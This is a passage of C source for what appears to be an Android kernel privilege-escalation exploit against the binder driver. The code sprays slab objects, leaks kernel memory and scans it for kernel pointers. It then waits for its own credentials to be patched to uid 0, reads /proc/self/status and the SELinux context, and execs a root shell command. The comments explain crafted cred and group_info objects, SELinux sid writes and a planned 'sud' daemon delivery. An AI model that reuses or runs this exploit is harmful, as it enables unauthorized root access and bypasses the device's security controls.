    int i, n = want > 64 ? 64 : want, r, n0, sb;

    n0 = getgroups(0, NULL);
    sb = (int)prctl(PR_GET_SECUREBITS, 0, 0, 0, 0);
    r = (n0 == n) ? getgroups(n, gb) : -1;
    graw("GRP rc=%d uid=%d sb=%d n0=%d", n0, (int)getuid(), sb, n0);
    for (i = 0; r > 0 && i < r && i < n; i++)
        graw(" %08x", (unsigned)gb[i]);
    graw("\n");
}

static void grp_dump(int want)
{
    gid_t gb[64];
    int i, n = want > 64 ? 64 : want, r, n0;

    /* Probe without dereferencing blocks[0] first: getgroups(0, NULL) only reads
     * group_info->ngroups, so it announces "the crafted group_info is reachable" without touching
     * the block pointer at all.  Three crashes this session died between the cred redirect and the
     * first buffered read, so the buffered read only happens once that probe agrees. */
    errno = 0;
    n0 = getgroups(0, NULL);
    printf("GRP rc=%d errno=%d uid=%d sb=%d n0=%d", n0, n0 < 0 ? errno : 0, (int)getuid(),
           (int)prctl(PR_GET_SECUREBITS, 0, 0, 0, 0), n0);
    if (n0 == n) {
        r = getgroups(n, gb);
        if (r > n)
            r = n;
        for (i = 0; r >= 0 && i < r; i++)
            printf(" %08x", (unsigned)gb[i]);
    } else
        printf(" skip=%d", n);
    printf("\n");
    fflush(stdout);
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 1;
    size_t span = 0x4000;
    size_t cap;
    const char *e = getenv("SPAN");
    const char *pctrl = getenv("PCTRL");
    char *fill, *stream;
    int epfd, r;

    if (e)
        span = strtoul(e, NULL, 0);
    if (span < 0x100 || span > (1UL << 26)) {
        printf("SPAN=%zu out of [256, 64MiB] -- refusing\n", span);
        return 1;
    }
    cap = span + 0x40000;
    setvbuf(stdout, NULL, _IONBF, 0);
    fill = calloc(IOVEC_ARRAY_SZ, BLK);
    stream = mmap(NULL, cap, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (!fill || stream == MAP_FAILED) { perror("alloc"); return 1; }
    for (int j = 0; j < IOVEC_ARRAY_SZ; j++) memset(fill + j * BLK, MARK(j), BLK);
    /* positive control for the needle finder: an ASCII string inside MY block 3, which
     * the stream must show.  No control -> a pile of 0 hits means nothing. */
    if (pctrl && strlen(pctrl) < 0x800)
        memcpy(fill + 3 * BLK + 0x400, pctrl, strlen(pctrl) + 1);

    /* NICE=n plants a value only WE carry into every binder_proc the kernel makes for this task:
     * binder_open stores task_nice(current) at proc+0x1d0, so a candidate must hold our pid AND
     * that chosen small number.  Must happen before the first /dev/binder open, and raising nice
     * is unprivileged (lowering it would need CAP_SYS_NICE). */
    {
        const char *nz = getenv("NICE");

        if (nz && *nz) {
            int n = atoi(nz);

            if (setpriority(PRIO_PROCESS, 0, n) != 0)
                printf("  NICE=%d: setpriority failed errno=%d -> planted value NOT in effect\n", n, errno);
            printf("  nice planted: requested=%d getpriority=%ld  (the needle wants proc+0x1d0=%d; "
                   "the driver cross-checks `ps -o ni` from outside)\n",
                   n, self_nice(), n);
            if (self_nice() != n)
                printf("    WARNING: kernel says nice=%ld, not %d -- the planted value is %ld\n",
                       self_nice(), n, self_nice());
            /* THIS is the pair the needle needs when there is no witness child: the acceptance test
             * walks g_plant[], and without this line a parent-only run (nplant==0) rejects every
             * candidate -- 20 rounds, "0 proc accepted", and the log reads as if the slab were cold
             * when in fact the needle could never have accepted anything (ledger 495). */
            if (nplant < 64) {
                g_plant[nplant].pid = (unsigned int)getpid();
                g_plant[nplant].nice = self_nice();
                nplant++;
                printf("  planted pair 0: pid=%u nice=%ld (this process)\n",
                       g_plant[0].pid, g_plant[0].nice);
            }
        } else
            printf("  NICE unset: the proc needle will have no planted second value (nice=%ld)\n",
                   (long)getpriority(PRIO_PROCESS, 0));
    }
    /* BPFDS=n: n extra /dev/binder opens, kept open for the whole run.  Each makes the kernel
     * kzalloc another binder_proc for THIS task in the same kmalloc-512 queue as our freed thread
     * slot, and every one of them stores the same (pid, tsk, planted nice) triple -- that is what
     * turns the needle from a shape guess into an agreement we manufactured. */
    {
        const char *bz = getenv("BPFDS");
        int n = bz ? atoi(bz) : 0, k, made = 0;

        if (n > 24)
            n = 24;
        for (k = 0; k < n; k++) {
            int x = open("/dev/binder", O_RDONLY);

            if (x < 0) { printf("  bpfds: open failed at %d errno=%d\n", k, errno); break; }
            made++;
        }
        printf("  bpfds: %d extra binder_proc(s) of pid %u kept open\n", made, (unsigned)getpid());
    }

    /* SPRAY=n: fork n children, each naming itself with a distinct prctl(PR_SET_NAME) tag,
     * and leave them alive.  Two reasons: every fork allocates a fresh task_struct from the
     * cache the window covers (so our own tasks become candidates rather than long-dead
     * neighbours), and the unique name doubles as the *selector* -- a hit tells us which
     * child we can reach.  Children share this process's cred (fork does get_cred, not
     * copy_creds), and this process got a fresh cred at execve, so patching that one object
     * roots exactly our own tree and nothing outside it. */
    {
        const char *sp = getenv("SPRAY");
        int n = sp ? atoi(sp) : 0, k;

        if (n > 64)
            n = 64;
        for (k = 0; k < n; k++) {
            char nm[16];
            pid_t p = fork();

            if (p == 0) {
                int dn = open("/dev/null", O_RDWR);

                snprintf(nm, sizeof nm, "XPL%03d", k);
                /* a sleeping child that still holds our stdout makes the driver's
                 * `adb shell ... | grep` wait for the whole sleep instead of for EOF */
                if (dn >= 0) {
                    dup2(dn, 0);
                    dup2(dn, 1);
                    dup2(dn, 2);
                    if (dn > 2)
                        close(dn);
                }
                prctl(PR_SET_NAME, nm, 0, 0, 0);
                sleep(240);
                _exit(0);
            }
        }
        if (n)
            printf("  spray: %d children named XPL000..XPL%03d\n", n, n - 1);
    }

    install_signal_witness();
    pin0();
    /* WCHILD=<nice>: fork the task that will be patched, while we are still unprivileged -- AFTER
     * pin0(), so the child inherits the CPU0 affinity and its allocations share the parent's slab
     * neighbourhood.  The parent then only leaks and identifies; it is never the rooted one, so a
     * rooted task's fatal first-clone never enters the picture -- and the delivery needs exactly
     * this shape (app forks the daemon at uid 2000, the driver patches that child, the child
     * execve's it into sud). */
    /* SPRAYT=n: fork and reap n throwaway tasks first.  task_struct slots come back to the
     * task_struct cache's per-cpu freelists on exit, so the churn spreads that cache over many
     * pages across *both* bands the leak samples, and the n long-lived children afterwards land on
     * those scattered free slots.  Without it, the children's task_structs sit in freshly handed-out
     * pages that the kmalloc-512-anchored window almost never covers (measured: 0 hits in 61
     * windows while the named task stayed in a different band). */
    {
        const char *st = getenv("SPRAYT");
        int n = st ? atoi(st) : 0, k, reaped = 0;

        for (k = 0; k < n; k++) {
            pid_t q = fork();

            if (q == 0)
                _exit(0);
            if (q < 0)
                break;
        }
        for (k = 0; k < n; k++) {
            int st = 0;
            pid_t r = wait(&st);

            if (r < 0)
                break;
            reaped++;
        }
        printf("  sprayt: %d throwaway tasks forked, %d reaped\n", n, reaped);
        fflush(stdout);
    }

    {
        const char *wc = getenv("WCHILD");
        const char *wk = getenv("WKIDS");
        int n = wk ? atoi(wk) : 1, k;

        if (n > 40)
            n = 40;
        /* nice is only settable in [-20,19], so the planted values cycle inside 8..19; the pid is
         * what makes each child's (pid, nice) pair unique, so cycling does not weaken the test. */
        for (k = 0; wc && k < n; k++)
            witness_child(atol(wc) + (k % 12));
    }

    epfd = epoll_create(1000);
    printf("fill=%p stream=%p span=%#zx cap=%#zx  markers 0x%02x..0x%02x  pctrl=%s\n",
           (void *)fill, (void *)stream, span, cap, MARK(0), MARK(IOVEC_ARRAY_SZ - 1),
           pctrl ? pctrl : "(none)");
    if (argc > 2 && !strcmp(argv[2], "probe"))
        probe_bc(0);

    for (r = 0; r < rounds; r++) {
        size_t got = 0;
        printf("--- round %d ---\n", r);
        /* Each round frees a thread slot and gets a fresh window around it, so opening more of our
         * own binder_procs between rounds keeps putting objects into the neighbourhood the next
         * round leaks -- that is what makes the >=2-distinct-candidates agreement reachable rather
         * than a one-round lottery (measured: procs opened only at start left 1 of 8 visible). */
        {
            const char *pe = getenv("PERROUND");
            int want = pe ? atoi(pe) : 2, z, made = 0;

            for (z = 0; z < want; z++) {
                int x = open("/dev/binder", O_RDONLY);

                if (x < 0) { printf("  per-round open failed errno=%d\n", errno); break; }
                made++;
            }
            if (made)
                printf("  round %d: %d more binder_proc(s) of pid %u\n", r, made, (unsigned)getpid());
        }
        if (attempt(epfd, fill, stream, &got, cap, span)) { printf("attempt failed\n"); continue; }
        {
            size_t i = 0, foreign = 0, nruns = 0;
            printf("  expected clean runs: e[3]=0x%02x 4096 | e[4]=0x%02x 65537(lock mutated) | e[5]=0x%02x %#zx\n",
                   MARK(3), MARK(4), MARK(5), span);
            while (i < got) {
                size_t j = i;
                int v = (unsigned char)stream[i];
                while (j < got && (unsigned char)stream[j] == v) j++;
                int is_mark = (v >= MARK(0) && v <= MARK(IOVEC_ARRAY_SZ - 1));
                if (nruns < 14)
                    printf("    [%06zu..%06zu] byte=%02x len=%zd %s\n", i, j, v, j - i,
                           is_mark ? "marker" : "*** NON-MARKER (kernel data) ***");
                if (!is_mark) foreign += j - i;
                nruns++;
                i = j;
            }
            printf("  runs=%zu non-marker=%zu verdict=%s\n", nruns, foreign,
                   foreign ? "LEAKED" : (nruns == 3 ? "clean(3 runs)" : "CHECK RUN LENGTHS"));
            {
                /* strict criterion: only a real kernel VA counts. Non-marker bytes
                 * alone (zeros of my own buffer) used to print LEAKED, which is how
                 * a miss was read as a hit. */
                size_t q, kva = 0;
                for (q = 0; q + 8 <= got; q += 8) {
                    unsigned long v;
                    memcpy(&v, stream + q, 8);
                    if (v >= 0xffffff8000000000UL)  /* canonical for VA_BITS=39: PAGE_OFFSET-1GB band; >=0xffff80.. also matches struct-page flag words and gave a FALSE 'REAL LEAK' (ledger 168) */
                        kva++;
                }
                printf("  strict: kernel-VA qwords=%zu -> %s\n", kva,
                       kva ? "REAL LEAK" : "no kernel pointer: NOT a leak");
                report_window(stream, got);
            }
            if (foreign) {
                int shown = 0;
                FILE *f;
                printf("  --- kernel-looking qwords ---\n");
                for (size_t q = 0; q + 8 <= got && shown < 40; q += 8) {
                    unsigned long v;
                    memcpy(&v, stream + q, 8);
                    if (v >= 0xffffff8000000000UL)  /* canonical for VA_BITS=39: PAGE_OFFSET-1GB band; >=0xffff80.. also matches struct-page flag words and gave a FALSE 'REAL LEAK' (ledger 168) */ {
                        printf("    [%05zu] %016lx%s\n", q, v,
                               (v & 0x3fffUL) == 0 ? "   <16K-aligned: kernel stack / thread_info?>" : "");
                        shown++;
                    }
                }
                f = fopen("/data/local/tmp/broot.leak", "wb");
                if (f) { fwrite(stream, 1, got, f); fclose(f); printf("  saved raw stream (%zu)\n", got); }
            }
        }
    }
    {
        const char *h = getenv("HOLD");

        if (h && *h) {
            int secs = atoi(h), i, detached = 0, grp = getenv("GRP") ? atoi(getenv("GRP")) : 0;

            /* If a signal ends this task, name it.  Three runs reported EXIT=0 while dying inside a
             * syscall, which is contradictory: a signalled death should read 128+sig and a clean exit
             * should have flushed stdio.  So catch everything catchable and mark it before leaving --
             * SIGKILL/SIGSTOP stay uncatchable, and "no marker + EXIT=137" is itself the answer. */
            {
                static const int sgns[] = { SIGTERM, SIGSYS, SIGSEGV, SIGBUS, SIGXCPU, SIGABRT,
                                            SIGPIPE, SIGHUP, SIGILL, SIGTRAP };
                struct sigaction sa;
                size_t k;

                memset(&sa, 0, sizeof sa);
                sa.sa_handler = sigmark;
                sigemptyset(&sa.sa_mask);
                for (k = 0; k < sizeof sgns / sizeof *sgns; k++)
                    sigaction(sgns[k], &sa, NULL);
            }
            show_creds("pre ");
            /* Probe with a real child execve every 2 s rather than sleeping once through a long
             * hold: the patch is fired by another process, so a single end-of-hold print would need
             * the holder to survive (two holders were killed mid-hold, with no kernel fault in dmesg
             * -- ledger 488).  A repeated probe cannot be missed by timing.
             * SELFNICE is the *identity* channel: getpriority() is computed by the kernel as
             * current->static_prio - 120, so it reads the very field the driver writes (+0x54) through
             * a syscall -- and the driver cross-checks it with `ps -o ni`, which reads the same field
             * of that task through procfs from *another* process.  Nothing here runs in the child: the
             * fork is the last thing in the iteration. */
            if (grp)
                gfd = open("/data/local/tmp/grp.txt", O_WRONLY | O_CREAT | O_TRUNC, 0666);
            printf("  GRP raw channel fd=%d\n", gfd);
            for (i = 0; 2 * i < secs; i++) {
                /* Borrowed-credential phase: raw reporting only, then straight to sleep. */
                if (grp && gfd >= 0 && (int)prctl(PR_GET_SECUREBITS, 0, 0, 0, 0) ==
                                   (getenv("SBMARK") ? atoi(getenv("SBMARK")) : 0x40)) {
                    grp_raw(grp);
                    sleep(2);
                    continue;
                }
                printf("  probe %d: SELFUID=%d SELFNICE=%ld\n", i, (int)getuid(), self_nice());
                fflush(stdout);
                if (grp)
                    grp_dump(grp);
                if (getuid() == 0 || q_fsuid() == 0) {
                    int k, fd;

                    printf("  ROOTED after %d probe(s): getuid=%d fsuid=%d fsgid=%d getegid=%d\n",
                           i + 1, (int)getuid(), q_fsuid(), q_fsgid(), (int)getegid());
                    fflush(stdout);
                    sleep(3);
                    printf("  step A: still alive 3 s after the swap, uid=%d nice=%ld\n",
                           (int)getuid(), self_nice());
                    fflush(stdout);
                    /* Every line below goes through graw() = the fd opened at the START of the hold,
                     * while this task was still uid 2000.  That is deliberate: run 26/27 both printed
                     * "step A" and then nothing, and the ladder's own file was NEVER created -- so the
                     * first NEW open() as uid 0 is the prime suspect, and a channel that needs no open
                     * is the only witness that can outlive it.  A marker comes BEFORE and AFTER each
                     * call, so "which line is last" names the syscall class, not a guess. */
                    graw("M idle begin uid=%d euid=%d fsuid=%d nice=%ld\n", (int)getuid(),
                         (int)geteuid(), q_fsuid(), self_nice());
                    /* Ten seconds of nothing but write() on an already-open fd: separates "the first
                     * syscall as root kills us" from "a guard kills us N seconds after uid becomes 0". */
                    for (k = 0; k < 20; k++) {
                        graw("M idle %d uid=%d fsuid=%d\n", k, (int)getuid(),
                             q_fsuid());
                        usleep(500000);
                    }
                    graw("M idle done -- uid still %d\n", (int)getuid());
                    /* Order matters: a file we created while still uid 2000, opened read-only.  If
                     * THIS one is already fatal, the trigger is the credential, not the filesystem. */
                    graw("M P1 before open(/data/local/tmp/normal.txt) uid=%d\n", (int)getuid());
                    {
                        char pb[128];
                        int pfd = open("/data/local/tmp/normal.txt", O_RDONLY);
                        int pn;
                        graw("M P1b open -> fd=%d errno=%d (still alive)\n", pfd, pfd < 0 ? errno : 0);
                        if (pfd >= 0) {
                            pn = read(pfd, pb, sizeof pb - 1);
                            if (pn > 0) { pb[pn] = 0; graw("M P1c read=%d first=%.24s\n", pn, pb); }
                            else graw("M P1c read=%d\n", pn);
                            close(pfd);
                        }
                    }
                    /* Our own SELinux context, read back through the fd we just managed to open.  If
                     * the sid we wrote took, this prints the new domain NAME -- and that is the
                     * second, independent source the type-number table still owes (ledger 498: 7's
                     * indices came from one walker only). */
                    graw("M P1d before open(/proc/self/attr/current)\n");
                    {
                        int afd = open("/proc/self/attr/current", O_RDONLY);
                        char ab[128];
                        int an;
                        graw("M P1e attr/current open -> fd=%d errno=%d\n", afd, afd < 0 ? errno : 0);
                        if (afd >= 0) {
                            an = read(afd, ab, sizeof ab - 1);
                            if (an > 0) { ab[an] = 0; graw("M P1f our context = %s\n", ab); }
                            else graw("M P1f attr/current read=%d\n", an);
                            close(afd);
                        }
                    }
                    graw("M P2 before statfs-ish access() on the same path\n");
                    graw("M P2b access -> rc=%d errno=%d\n",
                         access("/data/local/tmp/normal.txt", R_OK), errno);
                    graw("M A1 before open(/proc/self/status)\n");
                    fd = open("/proc/self/status", O_RDONLY);
                    graw("M A1 open -> fd=%d errno=%d\n", fd, fd < 0 ? errno : 0);
                    if (fd >= 0) {
                        char sb[2048];
                        int sn = read(fd, sb, sizeof sb - 1);
                        close(fd);
                        graw("M A1 read=%d\n", sn);
                        if (sn > 0) {
                            char *ln;
                            sb[sn] = 0;
                            for (ln = strtok(sb, "\n"); ln; ln = strtok(NULL, "\n"))
                                if (!strncmp(ln, "Uid:", 4) || !strncmp(ln, "Gid:", 4) ||
                                    !strncmp(ln, "Cap", 3) || !strncmp(ln, "Groups", 6) ||
                                    !strncmp(ln, "Seccomp", 7))
                                    graw("M A1   %s\n", ln);
                        }
                    }
                    graw("M A2 before open(lad.txt, O_CREAT)\n");
                    lfd = open("/data/local/tmp/lad.txt", O_WRONLY | O_CREAT | O_TRUNC, 0666);
                    graw("M A2 open -> fd=%d errno=%d\n", lfd, lfd < 0 ? errno : 0);
                    if (lfd >= 0) close(lfd);
                    lfd = -1;
                    graw("M A3 before pipe2\n");
                    {
                        int pv[2], rc = pipe2(pv, 0);
                        graw("M A3 pipe2 -> rc=%d errno=%d\n", rc, rc < 0 ? errno : 0);
                        if (rc == 0) { close(pv[0]); close(pv[1]); }
                    }
                    graw("M A4 before fork (child writes child.txt by its OWN new fd, then _exit(7))\n");
                    {
                        pid_t f = fork();
                        int fst = 0;

                        if (f == 0) {
                            int cfd = open("/data/local/tmp/child.txt",
                                           O_WRONLY | O_CREAT | O_TRUNC, 0666);
                            char b[200];
                            int n = snprintf(b, sizeof b,
                                             "CHILD pid=%d ppid=%d uid=%d euid=%d gid=%d egid=%d nice=%ld cfd=%d\n",
                                             (int)getpid(), (int)getppid(), (int)getuid(),
                                             (int)geteuid(), (int)getgid(), (int)getegid(),
                                             self_nice(), cfd);
                            if (cfd >= 0) { ssize_t w = write(cfd, b, n); (void)w; close(cfd); }
                            _exit(7);
                        }
                        graw("M A4 fork -> pid=%d errno=%d\n", (int)f, f < 0 ? errno : 0);
                        if (f > 0) {
                            waitpid(f, &fst, 0);
                            graw("M A4 child waited status=%d exited=%d sig=%d\n", fst,
                                 WIFEXITED(fst), WIFSIGNALED(fst) ? WTERMSIG(fst) : 0);
                        }
                    }
                    graw("M A5 parent still alive after fork+wait, uid=%d\n", (int)getuid());
                    printf("  step B: reached the end of the non-exec ladder, uid=%d\n", (int)getuid());
                    fflush(stdout);
                    sync();
                    graw("M A6 before execve IN PLACE (replaces this image)\n");
                    fflush(stdout);
                    execl("/system/bin/sh", "sh", "-c",
                          "echo INPLACE uid=$(id -u) gid=$(id -g) cap=$(grep -m1 CapEff /proc/self/status) > /data/local/tmp/inplace.txt; sync",
                          (char *)0);
                    graw("M A6b execl RETURNED errno=%d -- image not replaced\n", errno);
                    printf("  step C: execl returned errno=%d\n", errno);
                    fflush(stdout);
                    break;
                }
                /* No cred-COPYING while cred points at our crafted object: a fork's copy_creds hands
                 * that cred to a child, and the child's exit path would kfree the tsec and the
                 * group_info we parked inside modprobe_path/uts -- kfree of a non-slab pointer, which
                 * is the oops that rebooted ledger 493's two runs.  securebits==SBMARK is the marker
                 * that says the crafted cred is the one in use, so it gates this too. */
                if (!grp || (int)prctl(PR_GET_SECUREBITS, 0, 0, 0, 0) !=
                             (getenv("SBMARK") ? atoi(getenv("SBMARK")) : 0x40))
                    exec_probe(i);
                sleep(2);
            }
            show_creds("post");
        }
    }
    return 0;
}
